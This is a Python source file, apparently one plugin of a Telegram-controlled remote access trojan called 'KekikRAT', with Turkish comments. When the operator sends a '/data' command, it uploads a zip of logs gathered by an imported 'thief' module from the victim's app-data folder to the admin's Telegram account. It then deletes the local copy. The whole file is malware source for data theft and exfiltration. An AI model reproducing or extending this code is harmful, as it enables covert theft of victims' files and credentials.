#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client, Filters
from KekikRAT import adminID
from data.hirsiz import *

@Client.on_message(Filters.command(['data'], ['!','.','/']))
def data(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `data` Komutunu Verdi!\n\n"

    client.send_document(adminID, f'{app_data}{kullanici_adi}_LOG.zip', 'rb')
    os.remove(app_data + f'{kullanici_adi}_LOG.zip')

    kekik.edit(mesaj)